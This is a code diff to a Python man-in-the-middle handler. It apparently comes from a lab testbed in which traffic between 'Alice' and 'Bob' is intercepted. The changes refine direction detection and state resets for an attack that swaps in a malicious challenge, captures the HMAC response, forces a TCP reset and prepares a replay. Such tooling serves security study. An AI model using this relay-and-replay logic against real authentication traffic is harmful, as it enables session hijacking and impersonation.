@@ -21,7 +21,8 @@ class MitmGlobalState:
                 'original_hmac': None,
                 'replay_ready': False,
                 'connection_count': 0,
-                'message_count': 0
+                'message_count': 0,
+                'challenge_seen': False # Added for new connection tracking
             }
         return cls._instance
     
@@ -37,7 +38,8 @@ class MitmGlobalState:
             'original_hmac': None,
             'replay_ready': False,
             'connection_count': 0,
-            'message_count': 0
+            'message_count': 0,
+            'challenge_seen': False # Reset for new connection
         }
 
 class MitmAttackHandler:
@@ -66,6 +68,15 @@ class MitmAttackHandler:
         if self.attack_log:
             logging.info(f"[MITM] IP direction: {source_ip} -> {target_ip}, mapped to direction: {direction}, payload: {payload[:50] if payload else 'None'}...")
         return payload
+
+    def get_correct_direction_name(self, source_ip, target_ip):
+        """Get the correct direction name based on IP addresses"""
+        if source_ip == "10.10.20.13" and target_ip == "10.10.20.11":
+            return "bob_to_alice"
+        elif source_ip == "10.10.20.11" and target_ip == "10.10.20.13":
+            return "alice_to_bob"
+        else:
+            return self.direction_name
 
     def force_tcp_rst(self, writer):
         """Force a TCP RST by setting SO_LINGER to 0 and closing the socket"""
@@ -118,6 +129,18 @@ class MitmAttackHandler:
         if not self.attack_enabled:
             return should_forward
             
+        # Get the correct direction name based on IP addresses
+        correct_direction = self.get_correct_direction_name(source_ip, target_ip) if source_ip and target_ip else self.direction_name
+        
+        # Reset state if this is a new connection (new source IP or target IP)
+        if source_ip and target_ip:
+            connection_key = f"{source_ip}:{target_ip}"
+            if not hasattr(self, '_last_connection_key') or self._last_connection_key != connection_key:
+                if self.attack_log:
+                    logging.info(f"[MITM] New connection detected: {connection_key}, resetting attack state")
+                self._last_connection_key = connection_key
+                self.global_state.reset_state()
+            
         self.global_state.state['message_count'] += 1
         
         # Enhanced logging for debugging
@@ -129,6 +152,7 @@ class MitmAttackHandler:
             logging.info(f"  State: {self.global_state.state['phase']}")
             logging.info(f"  Active: {self.global_state.state['active']}")
             logging.info(f"  Direction: {self.direction_name}")
+            logging.info(f"  Correct Direction: {correct_direction}")
             if source_ip and target_ip:
                 logging.info(f"  IP Direction: {source_ip} -> {target_ip}")
             
@@ -150,16 +174,22 @@ class MitmAttackHandler:
                 challenge_detected = True
                 
         if challenge_detected:
-            # Only handle challenges in bob_to_alice direction (when Bob sends to Alice)
-            if self.direction_name == 'bob_to_alice' and not self.global_state.state['active']:
+            # Handle challenges in bob_to_alice direction (when Bob sends to Alice)
+            # OR if this is the first challenge we've seen (regardless of direction)
+            if ((correct_direction == 'bob_to_alice' and not self.global_state.state['active']) or
+                (not self.global_state.state['active'] and not self.global_state.state.get('challenge_seen'))):
+                
                 self.global_state.state['active'] = True
                 self.global_state.state['phase'] = 'waiting_hmac'
                 self.global_state.state['original_challenge'] = original_data
                 self.global_state.state['connection_count'] += 1
+                self.global_state.state['challenge_seen'] = True
+                
                 if self.attack_log:
                     logging.info(f"[MITM] *** CHALLENGE DETECTED on connection #{self.global_state.state['connection_count']} ***")
                     logging.info(f"[MITM] Challenge content: {raw_msg}")
                     logging.info(f"[MITM] Original data length: {len(original_data)} bytes")
+                    logging.info(f"[MITM] Direction: {correct_direction}")
                 
                 # Get the correct malicious payload for this direction
                 malicious_payload_hex = self.get_attack_payload_for_direction(source_ip, target_ip) if source_ip and target_ip else self.attack_payload_hex
@@ -181,7 +211,7 @@ class MitmAttackHandler:
                         malicious_bytes = b''
                 else:
                     if self.attack_log:
-                        logging.warning(f"[MITM] No malicious payload configured for direction {self.direction_name}, sending empty payload")
+                        logging.warning(f"[MITM] No malicious payload configured for direction {correct_direction}, sending empty payload")
                 
                 # Send the malicious challenge to Alice
                 writer.write(malicious_bytes)
@@ -192,11 +222,11 @@ class MitmAttackHandler:
             else:
                 # In alice_to_bob direction or already active, forward normally
                 if self.attack_log:
-                    logging.info(f"[MITM] Forwarding challenge normally (direction: {self.direction_name}, active: {self.global_state.state['active']})")
+                    logging.info(f"[MITM] Forwarding challenge normally (direction: {correct_direction}, active: {self.global_state.state['active']})")
                 return True
                 
         # Detect HMAC from client (Alice) - this should be the response to our malicious challenge
-        elif (self.direction_name == 'alice_to_bob' and 
+        elif (correct_direction == 'alice_to_bob' and 
               self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'waiting_hmac' and 
               isinstance(raw_msg, (bytes, str))):
@@ -215,7 +245,7 @@ class MitmAttackHandler:
                 return "RST_CONNECTION"
                 
         # After reconnect, forward Bob's new challenge normally (don't replay old one)
-        elif (self.direction_name == 'bob_to_alice' and
+        elif (correct_direction == 'bob_to_alice' and
               self.global_state.state['active'] and 
               self.global_state.state['phase'] == 'waiting_reconnect' and 
               isinstance(raw_msg, (bytes, str))):
